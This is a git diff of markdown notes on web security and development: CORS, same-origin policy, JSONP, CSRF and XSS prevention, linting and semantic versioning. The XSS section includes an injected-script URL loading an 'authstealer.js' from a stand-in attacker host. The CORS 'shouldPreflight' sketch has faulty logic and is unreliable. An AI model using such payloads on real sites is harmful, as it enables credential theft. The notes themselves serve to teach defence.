@@ -1,56 +1,56 @@
 # Web
 
 - [Web](#web)
-    - [Same Origin Policy](#same-origin-policy)
-        - [Definition & Example](#definition-example)
-        - [Access Restriction](#access-restriction)
-            - [Network Access Restriction](#network-access-restriction)
-            - [Script API Access Restriction](#script-api-access-restriction)
-            - [Data Storage Access Restriction](#data-storage-access-restriction)
-        - [References](#references)
-    - [Cross Origin Methods](#cross-origin-methods)
-        - [`document.domain` property](#documentdomain-property)
-        - [[Cross-Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)](#cross-origin-resource-sharinghttpsenwikipediaorgwikicross-originresourcesharing)
-            - [[Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests)](#simple-requestshttpsdevelopermozillaorgen-usdocswebhttpcorssimplerequests)
-            - [[Preflighted Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests)](#preflighted-requestshttpsdevelopermozillaorgen-usdocswebhttpcorspreflightedrequests)
-            - [Request without Credentials](#request-without-credentials)
-            - [Request with Credentials](#request-with-credentials)
-            - [Expose Headers to Clients](#expose-headers-to-clients)
-            - [Forbidden header name in Fetch Spec (TODO:)](#forbidden-header-name-in-fetch-spec-todo)
-            - [CORS-safelisted request header(Simple Response Headers)  (TODO:)](#cors-safelisted-request-headersimple-response-headers-todo)
-            - [CORS Related HTTP Headers](#cors-related-http-headers)
-            - [Comparison with JSONP](#comparison-with-jsonp)
-            - [References](#references)
-        - [[Web Messaging (Cross-document messaging)](https://en.wikipedia.org/wiki/Web_Messaging)](#web-messaging-cross-document-messaginghttpsenwikipediaorgwikiwebmessaging)
-        - [[**JSONP**](https://en.wikipedia.org/wiki/JSONP)](#jsonphttpsenwikipediaorgwikijsonp)
-        - [[**WebSocket**](https://en.wikipedia.org/wiki/WebSocket)](#websockethttpsenwikipediaorgwikiwebsocket)
-    - [Security](#security)
-        - [[**C**ross-**S**ite **R**equest **F**orgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)](#cross-site-request-forgeryhttpsenwikipediaorgwikicross-siterequestforgery)
-        - [Prevention](#prevention)
-            - [**S**ynchronizer **T**oken **P**attern](#synchronizer-token-pattern)
-            - [Cookie-to-header token](#cookie-to-header-token)
-            - [Others](#others)
-        - [[Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)](#cross-site-scripting-xsshttpsenwikipediaorgwikicross-sitescripting)
-            - [Types](#types)
-            - [Prevention](#prevention)
-        - [[Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)](#content-security-policyhttpsenwikipediaorgwikicontentsecuritypolicy)
-        - [[Hash-based message authentication code](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code)](#hash-based-message-authentication-codehttpsenwikipediaorgwikihash-basedmessageauthenticationcode)
-    - [Web Development Engineering](#web-development-engineering)
-        - [Prettier](#prettier)
-        - [ESLint](#eslint)
-        - [Continuous Integration (CI) TODO:](#continuous-integration-ci-todo)
-        - [Continuous Development (CD) TODO:](#continuous-development-cd-todo)
-    - [Software Versioning](#software-versioning)
-        - [Version Control](#version-control)
-        - [Semantic Versioning](#semantic-versioning)
-            - [Rationale](#rationale)
-            - [Version Precendence](#version-precendence)
-            - [Version Syntax](#version-syntax)
-            - [Reference](#reference)
-    - [Sever Push Technology](#sever-push-technology)
-        - [Ajax Polling and Comet (Long Polling)](#ajax-polling-and-comet-long-polling)
-        - [Websocket](#websocket)
-        - [Server Sent Events](#server-sent-events)
+  - [Same Origin Policy](#same-origin-policy)
+    - [Definition & Example](#definition-example)
+    - [Access Restriction](#access-restriction)
+      - [Network Access Restriction](#network-access-restriction)
+      - [Script API Access Restriction](#script-api-access-restriction)
+      - [Data Storage Access Restriction](#data-storage-access-restriction)
+    - [References](#references)
+  - [Cross Origin Methods](#cross-origin-methods)
+    - [`document.domain` property](#documentdomain-property)
+    - [[Cross-Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)](#cross-origin-resource-sharinghttpsenwikipediaorgwikicross-originresourcesharing)
+      - [[Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests)](#simple-requestshttpsdevelopermozillaorgen-usdocswebhttpcorssimplerequests)
+      - [[Preflighted Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests)](#preflighted-requestshttpsdevelopermozillaorgen-usdocswebhttpcorspreflightedrequests)
+      - [Request without Credentials](#request-without-credentials)
+      - [Request with Credentials](#request-with-credentials)
+      - [Expose Headers to Clients](#expose-headers-to-clients)
+      - [Forbidden header name in Fetch Spec (TODO:)](#forbidden-header-name-in-fetch-spec-todo)
+      - [CORS-safelisted request header(Simple Response Headers) (TODO:)](#cors-safelisted-request-headersimple-response-headers-todo)
+      - [CORS Related HTTP Headers](#cors-related-http-headers)
+      - [Comparison with JSONP](#comparison-with-jsonp)
+      - [References](#references)
+    - [[Web Messaging (Cross-document messaging)](https://en.wikipedia.org/wiki/Web_Messaging)](#web-messaging-cross-document-messaginghttpsenwikipediaorgwikiwebmessaging)
+    - [[**JSONP**](https://en.wikipedia.org/wiki/JSONP)](#jsonphttpsenwikipediaorgwikijsonp)
+    - [[**WebSocket**](https://en.wikipedia.org/wiki/WebSocket)](#websockethttpsenwikipediaorgwikiwebsocket)
+  - [Security](#security)
+    - [[**C**ross-**S**ite **R**equest **F**orgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)](#cross-site-request-forgeryhttpsenwikipediaorgwikicross-siterequestforgery)
+    - [Prevention](#prevention)
+      - [**S**ynchronizer **T**oken **P**attern](#synchronizer-token-pattern)
+      - [Cookie-to-header token](#cookie-to-header-token)
+      - [Others](#others)
+    - [[Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)](#cross-site-scripting-xsshttpsenwikipediaorgwikicross-sitescripting)
+      - [Types](#types)
+      - [Prevention](#prevention)
+    - [[Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)](#content-security-policyhttpsenwikipediaorgwikicontentsecuritypolicy)
+    - [[Hash-based message authentication code](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code)](#hash-based-message-authentication-codehttpsenwikipediaorgwikihash-basedmessageauthenticationcode)
+  - [Web Development Engineering](#web-development-engineering)
+    - [Prettier](#prettier)
+    - [ESLint](#eslint)
+    - [Continuous Integration (CI) TODO:](#continuous-integration-ci-todo)
+    - [Continuous Development (CD) TODO:](#continuous-development-cd-todo)
+  - [Software Versioning](#software-versioning)
+    - [Version Control](#version-control)
+    - [Semantic Versioning](#semantic-versioning)
+      - [Rationale](#rationale)
+      - [Version Precendence](#version-precendence)
+      - [Version Syntax](#version-syntax)
+      - [Reference](#reference)
+  - [Sever Push Technology](#sever-push-technology)
+    - [Ajax Polling and Comet (Long Polling)](#ajax-polling-and-comet-long-polling)
+    - [Websocket](#websocket)
+    - [Server Sent Events](#server-sent-events)
 
 ## Same Origin Policy
 
@@ -98,9 +98,9 @@ Example of same origin checking against `http://www.example.com/dir/page.html`
 | `http://www.example.com:81/dir/other.html`                 | Failure | Same protocol and host but different port            |
 | `https://www.example.com/dir/other.html`                   | Failure | Different protocol                                   |
 | `http://en.example.com/dir/other.html`                     | Failure | Different host                                       |
-| `http://example.com/dir/other.html`|Failure|Different host (exact match required)
-|`http://v2.www.example.com/dir/other.html`|Failure|Different host (exact match required)
-|`http://www.example.com:80/dir/other.html`|Depends|Port explicit. Depends on implementation in browser.
+| `http://example.com/dir/other.html`                        | Failure | Different host (exact match required)                |
+| `http://v2.www.example.com/dir/other.html`                 | Failure | Different host (exact match required)                |
+| `http://www.example.com:80/dir/other.html`                 | Depends | Port explicit. Depends on implementation in browser. |
 
 ### Access Restriction
 
@@ -110,13 +110,13 @@ Same origin policy restricts how a document or script loaded in one origin can a
 
 1. Cross-origin _writes_ are typically allowed. This what we do when we submit form data to remote servers. But some HTTP request requires preflight.
 1. Cross-origin _embedding_ is typically allowed.
-    1. JavaScript with `<script src='...'></script>`
-    1. CSS with `<link rel='stylesheet' href='...'>`
-    1. Image with `<img src='...'/>`
-    1. Media files with `<video>` and `<audio>`
-    1. Plugins with `<object>`, `<embed>`, `<applet>`
-    1. Fonts with `@font-face`
-    1. Anything with `<frame>`, `<iframe>`
+   1. JavaScript with `<script src='...'></script>`
+   1. CSS with `<link rel='stylesheet' href='...'>`
+   1. Image with `<img src='...'/>`
+   1. Media files with `<video>` and `<audio>`
+   1. Plugins with `<object>`, `<embed>`, `<applet>`
+   1. Fonts with `@font-face`
+   1. Anything with `<frame>`, `<iframe>`
 1. Cross-origin _reads_ are typically not allowed.
 
 #### Script API Access Restriction
@@ -192,10 +192,10 @@ A special behaviour is that port number is stored separately by the browser. Any
 
 ```js
 // document1 (company.com:8080)
-document.domain = 'company.com'     // port changed to null
+document.domain = 'company.com' // port changed to null
 
 // document2 (company.com)
-document.domain = 'company.com'     // port changed to null
+document.domain = 'company.com' // port changed to null
 ```
 
 ### [Cross-Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)
@@ -211,39 +211,40 @@ Simple request is safe, which means it does not has any side effect (changing se
 ```javascript
 // TODO:
 function isStandardHeader(header) {
-    // is forbidden header
-    // is cros safelisted headers
+  // is forbidden header
+  // is cros safelisted headers
 }
 
 function containsCustomHeader(request) {
-    return request.headers.all(isStandardHeader)
+  return request.headers.all(isStandardHeader)
 }
 
 function contentTypeIsStandard(contentType) {
-    return contentType === 'application/x-www-form-urlencoded' ||
-        contentType === 'multipart/form-data' ||
-        contentType === 'text/plain'
+  return (
+    contentType === 'application/x-www-form-urlencoded' ||
+    contentType === 'multipart/form-data' ||
+    contentType === 'text/plain'
+  )
 }
 
 function shouldPreflight(request) {
-    if (request.method !== 'GET' ||
-        request.method !== 'HEAD' ||
-        request.method !== 'POST'
-    ) {
-        return true
-    }
+  if (
+    request.method !== 'GET' ||
+    request.method !== 'HEAD' ||
+    request.method !== 'POST'
+  ) {
+    return true
+  }
 
-    if (containsStandardHeaderOnly(request)) {
-        return true
-    }
+  if (containsStandardHeaderOnly(request)) {
+    return true
+  }
 
-    if (request.method === 'GET' ||
-        request.method === 'HEAD'
-    ) {
-        return false
-    }
+  if (request.method === 'GET' || request.method === 'HEAD') {
+    return false
+  }
 
-    return !contentTypeIsStandard(request)
+  return !contentTypeIsStandard(request)
 }
 ```
 
@@ -252,102 +253,101 @@ function shouldPreflight(request) {
 A request is a simple one if it meets all following conditions:
 
 1. Allowed methods are `GET`, `HEAD` and `POST`.
-1. Request must only contains headers `Connection`, `User-Agent`, [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name) and  [CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header).
+1. Request must only contains headers `Connection`, `User-Agent`, [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name) and [CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header).
 1. Allowed values for `Content-Type` header are:
-    - `application/x-www-form-urlencoded`
-    - `multipart/form-data`
-    - `text/plain`
+   - `application/x-www-form-urlencoded`
+   - `multipart/form-data`
+   - `text/plain`
 1. No event listeners are registered on any `XMLHttpRequestUpload` object (`XMLHttpRequest.upload`) used in request.
 1. No `ReadableStream` object is used in the request.
 
 Example of simple request from `http://www.example.com` to `http://service.example.com`.
 
 1. Browser sends **OPTIONS** request with `Origin` HTTP header.
-    ```http
-    Origin: http://www.example.com
-    ```
+   ```http
+   Origin: http://www.example.com
+   ```
 1. Server responds according to target resource cross-origin acccessibility.
-    1. Target resrouce is allowed to be accessed from specific origin.
-        ```http
-        Access-Control-Allow-Origin: http://www.example.com
-        Vary: Origin
-        ```
-    1. Target resource is allowed be accessed from any origin. It's often used when resource is intended to be completely public and accessible to everyone.
-        ```http
-        Access-Control-Allow-Origin: *
-        ```
-    1. An error page if server does not allow the cross-origin request.
+   1. Target resrouce is allowed to be accessed from specific origin.
+      ```http
+      Access-Control-Allow-Origin: http://www.example.com
+      Vary: Origin
+      ```
+   1. Target resource is allowed be accessed from any origin. It's often used when resource is intended to be completely public and accessible to everyone.
+      ```http
+      Access-Control-Allow-Origin: *
+      ```
+   1. An error page if server does not allow the cross-origin request.
 
 #### [Preflighted Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests)
 
 Preflighted requests contains two requests: a preflight request at first, then an actual request on successful preflight request. A request is a preflighted request if any of following conditions is met.
 
 1. Request uses following methods.
-    - `PUT`
-    - `DELETE`
-    - `CONNECT`
-    - `OPTIONS`
-    - `TRACE`
-    - `PATCH`
-1. Request uses HTTP headers not included by `Connection`, `User-Agent`, [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name) and  [CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header).
+   - `PUT`
+   - `DELETE`
+   - `CONNECT`
+   - `OPTIONS`
+   - `TRACE`
+   - `PATCH`
+1. Request uses HTTP headers not included by `Connection`, `User-Agent`, [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name) and [CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header).
 1. Request HTTP header `Content-Type` has a value other than:
-    - `application/x-www-form-urlencoded`
-    - `multipart/form-data`
-    - `text/plain`
+   - `application/x-www-form-urlencoded`
+   - `multipart/form-data`
+   - `text/plain`
 1. One or more event listeners are registered on an `XMLHttpRequestUpload` object.
 1. A `ReadableStream` object is used in the request.
 
 Example of preflighted requests using `POST` method, custom HTTP header `X-PINGOTHER` and non-standard content type `application/xml`.
 
 ```javascript
-var invocation = new XMLHttpRequest();
-var url = 'http://bar.other/resources/post-here/';
-var body = '<?xml version="1.0"?><person><name>Arun</name></person>';
+var invocation = new XMLHttpRequest()
+var url = 'http://bar.other/resources/post-here/'
+var body = '<?xml version="1.0"?><person><name>Arun</name></person>'
 
-function callOtherDomain(){
-  if(invocation)
-    {
-      invocation.open('POST', url, true)
-      invocation.setRequestHeader('X-PINGOTHER', 'pingpong')
-      invocation.setRequestHeader('Content-Type', 'application/xml')
-      invocation.onreadystatechange = handler
-      invocation.send(body)
-    }
+function callOtherDomain() {
+  if (invocation) {
+    invocation.open('POST', url, true)
+    invocation.setRequestHeader('X-PINGOTHER', 'pingpong')
+    invocation.setRequestHeader('Content-Type', 'application/xml')
+    invocation.onreadystatechange = handler
+    invocation.send(body)
+  }
 }
 ```
 
 HTTP request and response process are like below.
 
 1. Client sends an preflight HTTP request with `OPTIONS` method asking if target resource `/doc` on `service.example.com` is accessible from origin `http://www.example.com` using `PUT` method and specified custom headers.
-    ```http
-    OPTIONS /doc HTTP/1.1
-    Host: service.example.com
-    Origin: http://www.example.com
-    Access-Control-Request-Method: PUT
-    Access-Control-Request-Headers: X-PINGOTHER, Content-Type
-    ```
+   ```http
+   OPTIONS /doc HTTP/1.1
+   Host: service.example.com
+   Origin: http://www.example.com
+   Access-Control-Request-Method: PUT
+   Access-Control-Request-Headers: X-PINGOTHER, Content-Type
+   ```
 1. Server sends response message indicating that origin `http://www.example.com` can access target resource with specified methods and eaders.
-    ```http
-    HTTP/1.1 200 OK
-    Access-Control-Allow-Origin: http://www.example.com
-    Access-Control-Allow-Methods: POST, GET, OPTIONS
-    Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
-    Access-Control-Max-Age: 86400
-    ```
+   ```http
+   HTTP/1.1 200 OK
+   Access-Control-Allow-Origin: http://www.example.com
+   Access-Control-Allow-Methods: POST, GET, OPTIONS
+   Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+   Access-Control-Max-Age: 86400
+   ```
 1. Client sent main request with allowed method `POST` and headers on successful preflight request.
-    ```http
-    POST /doc HTTP/1.1
-    X-PINGOTHER: pingpong
-    Content-Type: text/html; charset=UTF-8
-    Origin: http://www.example.com
-    Access-Control-Request-Method: PUT
-    Access-Control-Request-Headers: X-PINGOTHER, Content-Type
-    ```
+   ```http
+   POST /doc HTTP/1.1
+   X-PINGOTHER: pingpong
+   Content-Type: text/html; charset=UTF-8
+   Origin: http://www.example.com
+   Access-Control-Request-Method: PUT
+   Access-Control-Request-Headers: X-PINGOTHER, Content-Type
+   ```
 1. Server send response message.
-    ```http
-    HTTP/1.1 200 OK
-    Access-Control-Allow-Origin: http://www.example.com
-    ```
+   ```http
+   HTTP/1.1 200 OK
+   Access-Control-Allow-Origin: http://www.example.com
+   ```
 
 #### Request without Credentials
 
@@ -357,10 +357,10 @@ Example of request without credential.
 
 ```javascript
 let invocation = new XMLHttpRequest()
-var url = 'http://bar.other/resources/public-data/';
+var url = 'http://bar.other/resources/public-data/'
 
 function callOtherDomain() {
-  if(invocation) {
+  if (invocation) {
     invocation.open('GET', url, true)
     invocation.onreadystatechange = handler
     invocation.send()
@@ -386,28 +386,28 @@ Origin: http://foo.example
 HTTP response message contains header `Access-Control-Allow-Origin`, two values are possible.
 
 1. `origin` - an URI as origin value which means that origin is allowed to access current resource, all other origin is blocked from accessing current resource in a cross-site manner. In this situation, value of `Vary` header in response may contain `Origin` to indicate that value of `Access-Control-Allow-Origin` header in response varies and depends on value of `Origin` header in request.
-    ```http
-    HTTP/1.1 200 OK
-    Date: Mon, 01 Dec 2008 00:23:53 GMT
-    Server: Apache/2.0.61
-    Access-Control-Allow-Origin: http://foo.example
-    Vary: Origin
-    Keep-Alive: timeout=2, max=100
-    Connection: Keep-Alive
-    Transfer-Encoding: chunked
-    Content-Type: application/xml
-    ```
+   ```http
+   HTTP/1.1 200 OK
+   Date: Mon, 01 Dec 2008 00:23:53 GMT
+   Server: Apache/2.0.61
+   Access-Control-Allow-Origin: http://foo.example
+   Vary: Origin
+   Keep-Alive: timeout=2, max=100
+   Connection: Keep-Alive
+   Transfer-Encoding: chunked
+   Content-Type: application/xml
+   ```
 1. `*` - an star means that any origin can access current resource.
-    ```http
-    HTTP/1.1 200 OK
-    Date: Mon, 01 Dec 2008 00:23:53 GMT
-    Server: Apache/2.0.61
-    Access-Control-Allow-Origin: *
-    Keep-Alive: timeout=2, max=100
-    Connection: Keep-Alive
-    Transfer-Encoding: chunked
-    Content-Type: application/xml
-    ```
+   ```http
+   HTTP/1.1 200 OK
+   Date: Mon, 01 Dec 2008 00:23:53 GMT
+   Server: Apache/2.0.61
+   Access-Control-Allow-Origin: *
+   Keep-Alive: timeout=2, max=100
+   Connection: Keep-Alive
+   Transfer-Encoding: chunked
+   Content-Type: application/xml
+   ```
 
 #### Request with Credentials
 
@@ -419,13 +419,13 @@ let invocation = new XMLHttpRequest()
 let url = 'http://bar.other/resources/credentialed-content/'
 
 function callOtherDomain() {
-    if (invocation) {
-        invocation.open('GET', url, true)
-        // sent with credentials
-        invocation.withCredentials = true
-        invocation.onreadystatechange = handler
-        invocation.send()
-    }
+  if (invocation) {
+    invocation.open('GET', url, true)
+    // sent with credentials
+    invocation.withCredentials = true
+    invocation.onreadystatechange = handler
+    invocation.send()
+  }
 }
 
 // Fetch with credentials
@@ -449,40 +449,40 @@ Cookie: pageAccess=2
 ```
 
 1. CORS request may be allowed by including `Access-Control-Allow-Credentials: true` in HTTP response.
-    ```http
-    HTTP/1.1 200 OK
-    Date: Mon, 01 Dec 2008 01:34:52 GMT
-    Server: Apache/2.0.61 (Unix) PHP/4.4.7 mod_ssl/2.0.61 OpenSSL/0.9.7e mod_fastcgi/2.4.2 DAV/2 SVN/1.4.2
-    X-Powered-By: PHP/5.2.6
-    Access-Control-Allow-Origin: http://foo.example
-    Access-Control-Allow-Credentials: true
-    Cache-Control: no-cache
-    Pragma: no-cache
-    Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
-    Vary: Accept-Encoding, Origin
-    Content-Encoding: gzip
-    Content-Length: 106
-    Keep-Alive: timeout=2, max=100
-    Connection: Keep-Alive
-    Content-Type: text/plain
-    ```
+   ```http
+   HTTP/1.1 200 OK
+   Date: Mon, 01 Dec 2008 01:34:52 GMT
+   Server: Apache/2.0.61 (Unix) PHP/4.4.7 mod_ssl/2.0.61 OpenSSL/0.9.7e mod_fastcgi/2.4.2 DAV/2 SVN/1.4.2
+   X-Powered-By: PHP/5.2.6
+   Access-Control-Allow-Origin: http://foo.example
+   Access-Control-Allow-Credentials: true
+   Cache-Control: no-cache
+   Pragma: no-cache
+   Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
+   Vary: Accept-Encoding, Origin
+   Content-Encoding: gzip
+   Content-Length: 106
+   Keep-Alive: timeout=2, max=100
+   Connection: Keep-Alive
+   Content-Type: text/plain
+   ```
 1. Or CORS request may be blocked by browser if HTTP response contains no `Access-Control-Allow-Credentials: true`.
-    ```http
-    HTTP/1.1 200 OK
-    Date: Mon, 01 Dec 2008 01:34:52 GMT
-    Server: Apache/2.0.61 (Unix) PHP/4.4.7 mod_ssl/2.0.61 OpenSSL/0.9.7e mod_fastcgi/2.4.2 DAV/2 SVN/1.4.2
-    X-Powered-By: PHP/5.2.6
-    Access-Control-Allow-Origin: http://foo.example
-    Cache-Control: no-cache
-    Pragma: no-cache
-    Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
-    Vary: Accept-Encoding, Origin
-    Content-Encoding: gzip
-    Content-Length: 106
-    Keep-Alive: timeout=2, max=100
-    Connection: Keep-Alive
-    Content-Type: text/plain
-    ```
+   ```http
+   HTTP/1.1 200 OK
+   Date: Mon, 01 Dec 2008 01:34:52 GMT
+   Server: Apache/2.0.61 (Unix) PHP/4.4.7 mod_ssl/2.0.61 OpenSSL/0.9.7e mod_fastcgi/2.4.2 DAV/2 SVN/1.4.2
+   X-Powered-By: PHP/5.2.6
+   Access-Control-Allow-Origin: http://foo.example
+   Cache-Control: no-cache
+   Pragma: no-cache
+   Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
+   Vary: Accept-Encoding, Origin
+   Content-Encoding: gzip
+   Content-Length: 106
+   Keep-Alive: timeout=2, max=100
+   Connection: Keep-Alive
+   Content-Type: text/plain
+   ```
 
 For preflighted requests, preflight request carries crendentials like simple requests. If preflight fails, main request will not be sent.
 
@@ -494,7 +494,7 @@ In the pre-CORS, same-origin-only world, a client could trigger a cross-origin r
 
 #### Forbidden header name in Fetch Spec (TODO:)
 
-#### CORS-safelisted request header(Simple Response Headers)  (TODO:)
+#### CORS-safelisted request header(Simple Response Headers) (TODO:)
 
 > A simple response header (or a CORS-safelisted response header) is an HTTP header which has been safelisted so that it will not be filtered when responses are processed by CORS, since they're considered safe (as the headers listed in Access-Control-Expose-Headers). By default, the safelist includes the following response headers:
 
@@ -631,8 +631,8 @@ Message event interface.
 Post message to target document `contentWindow` and origin `http://example.com`
 
 ```javascript
-var o = document.getElementsByTagName('iframe')[0];
-o.contentWindow.postMessage('Hello B', 'http://example.com/');
+var o = document.getElementsByTagName('iframe')[0]
+o.contentWindow.postMessage('Hello B', 'http://example.com/')
 ```
 
 Handles message event and post some messsage back to event source.
@@ -641,14 +641,13 @@ Handles message event and post some messsage back to event source.
 function receiver(event) {
   if (event.origin == 'http://example.net') {
     if (event.data == 'Hello B') {
-      event.source.postMessage('Hello A, how are you?', event.origin);
-    }
-    else {
-      alert(event.data);
+      event.source.postMessage('Hello A, how are you?', event.origin)
+    } else {
+      alert(event.data)
     }
   }
 }
-window.addEventListener('message', receiver, false);
+window.addEventListener('message', receiver, false)
 ```
 
 Origins must be carefully checked to prevent cross-site scripting. This methods is a modern solution in replace of communication through _`window.name`_ and _fragment identifier_, which should be avoided.
@@ -662,15 +661,16 @@ Origins must be carefully checked to prevent cross-site scripting. This methods 
 `<script>` element links to cross origin url.
 
 ```html
-<script type="application/javascript"
-    src="http://server.example.com/Users/1234?callback=parseResponse">
-</script>
+<script
+  type="application/javascript"
+  src="http://server.example.com/Users/1234?callback=parseResponse"
+></script>
 ```
 
 Returned pure JSON data is wrapped in a function call `parseResponse()` to enable scripts on current page to access it.
 
 ```javascript
-parseResponse({"Name": "Foo", "Id": 1234, "Rank": 7});
+parseResponse({ Name: 'Foo', Id: 1234, Rank: 7 })
 ```
 
 **JSONP** is susceptible to XSS attack and should be replaced by **CORS** due to inherent insecurities.
@@ -698,7 +698,11 @@ Most CSRF prevention techniques work by embedding aditional data into request th
 STP is a technique that injects unique and unpredictable token in all HTML forms rendered by server, so that each request from user contains this unique token. Attackers have no way to forge request with correct temporary token to pass server side validation.
 
 ```html
-<input type="hidden" name="csrfmiddlewaretoke" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt"/>
+<input
+  type="hidden"
+  name="csrfmiddlewaretoke"
+  value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt"
+/>
 ```
 
 STP introduces complexity on server side due to burden associated with token validation on each request. There two types of token generation strategies.
@@ -752,7 +756,7 @@ Actual content:
 http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></iframe>
 ```
 
-If it's clicked  `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.
+If it's clicked `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.
 
 **Persistent (or stored) XSS** refers to malicious content being saved by the server and embedded into normal pages delivered to all users. Persistent XSS vulnerability is much more devastating than non-persistent one, cause all users are susceptible to attack.
 
@@ -799,135 +803,6 @@ prettier.eslintIntegration: true
 
 prettier-eslint will infer prettier options from .eslintrc.js to format js code, so we can a single configuration file that applies to eslint/prettier and vscode prettier extension.
 
-### ESLint
-
-1. Globals: accessible global variables
-1. Environments: an environment is a collection of global variables
-1. Rules: a rule describes certain style linting definition.
-
-1. Configuraion files ".eslintrc.json" 或者 "package.json"
-
-```json
-// .eslintrc.json
-{
-  "plugins": ["example"],
-  "env": {
-    "example/custom": true
-  }
-}
-
-// package.json
-{
-  "name": "mypackage",
-  "version": "0.0.1",
-  "eslintConfig": {
-    "plugins": ["example"],
-    "env": {
-      "example/custom": true
-    }
-  }
-}
-```
-
-1. Inline configuration
-    1. `/*eslint-disable*/` and `/*eslint-enable*/`
-    1. `/*global*/`
-    1. `/*eslint*/`
-    1. `/*eslint-env*/`
-1. Command line options:
-    1. --global
-    1. --rule
-    1. --env
-    1. -c, --config
-1. Project-level configuration:
-    1. .eslintrc.\* or package.json file in same directory as linted file
-    1. Continue searching for .eslintrc and package.json files in ancestor directories (parent has highest precedence, then grandparent, etc.), up to and including the root directory or until a config with "root": true is found.
-
-In the absence of any configuration from (1) thru (3), fall back to a personal default configuration in ~/.eslintrc.
-
-- eslint-plugin-react
-- eslint-plugin-angular
-- eslint-plugin-node
-
-1. Specify preset recommended.
-1. eslint-watch
-1. eslint support ES6/ES7/Object spread by default, use babel-eslint to support experimental features.
-
-```json
-{
-  "root": true,
-  "extends": [
-    "eslint:recommended",
-    "plugin:import/errors",
-    "plugin:import/warnings"
-  ],
-
-  "parserOptions": {
-    "ecmaVersion": 7,
-    "sourceType": "module"
-  },
-
-  "env": {
-    "browser": true,
-    "node": true,
-    "mocha": true
-  },
-
-  "rules": {
-    "no-console": 1
-  }
-}
-```
-
-Configuration comments and configuration files
-
-```javascript
-/* global var1, var2 */
-/* global var1:false, var2: false */
-
-/* eslint eqeqeq: "off", curly: "error" */
-/* eslint eqeqeq: 0, curly: 2 */
-/* eslint quotes: ["error", "double"], curly: 2 */
-
-/* eslint "plugin1/rule1": "error" */
-
-/* eslint-disable no-alert, no-console */
-
-alert("foo");
-console.log("bar");
-
-/* eslint-enable no-alert, no-console */
-
-// disable all ruels
-alert("foo"); // eslint-disable-line
-
-// eslint-disable-next-line
-alert("foo");
-
-alert("foo"); // eslint-disable-line no-alert, quotes, semi
-
-// eslint-disable-next-line no-alert, quotes, semi
-alert("foo");
-
-foo(); // eslint-disable-line example/rule-name
-```
-
-```JSON
-{
-  "globals": {
-    "var1": true,
-    "var2": false
-  }
-}
-
-{
-  "rules": {
-    "eqeqeq": "off",
-    "curly": "error",
-    "quotes": ["error", "double"]
-  }
-}
-```
 
 ### Continuous Integration (CI) TODO:
 
@@ -937,7 +812,7 @@ Travis CI and Appveyor
 
 ## Software Versioning
 
-Software versioning is the process of assigning either _unique version names_ or  _unique version numbers_ to unique status of computer software. Modern software often uses two types of versioning schemes.
+Software versioning is the process of assigning either _unique version names_ or _unique version numbers_ to unique status of computer software. Modern software often uses two types of versioning schemes.
 
 ### Version Control
 
@@ -978,21 +853,21 @@ Semantic versioning is proposed to solve the problem of _dependency hell_. Given
 Precedence refers to how two versions are compared with each other when ordered. Build metadata doesn't contributes to precedence calculation.
 
 1. Precendence must be calculated by comparing _major_, _minor_, _patch_ version separately and numerically with _major_ having highest significance.
-    ```txt
-    1.0.0 < 2.0.0 < 2.1.0 < 2.1.1
-    ```
+   ```txt
+   1.0.0 < 2.0.0 < 2.1.0 < 2.1.1
+   ```
 1. When _major_, _minor_, _patch_ are all same, a _pre-release_ version has lower precedence than a normal one.
-    ```txt
-    1.0.0-alpha < 1.0.0
-    ```
+   ```txt
+   1.0.0-alpha < 1.0.0
+   ```
 1. When two pre-release versions have same _major_, _minor_, _patch_ version number, pre-release versions MUST be determined by comparing each dot separated identifier from left to right.
-    1. A larger set of pre-release version has a higher precedence than a smaller set.
-    1. Identifiers consisting of only digits are compared numerically.
-    1. Identifiers consisting of letters and hyphens are compared lexically in ASCII order.
-    1. Numeric identifiers has lower precedence than non-numeric identifiers.
-    ```txt
-    1.0.0-alpha < 1.0.0-alpha.1 < 1.0.0-alpha.beta < 1.0.0-beta < 1.0.0-beta.2 < 1.0.0-beta.11 < 1.0.0-rc.1 < 1.0.0
-    ```
+   1. A larger set of pre-release version has a higher precedence than a smaller set.
+   1. Identifiers consisting of only digits are compared numerically.
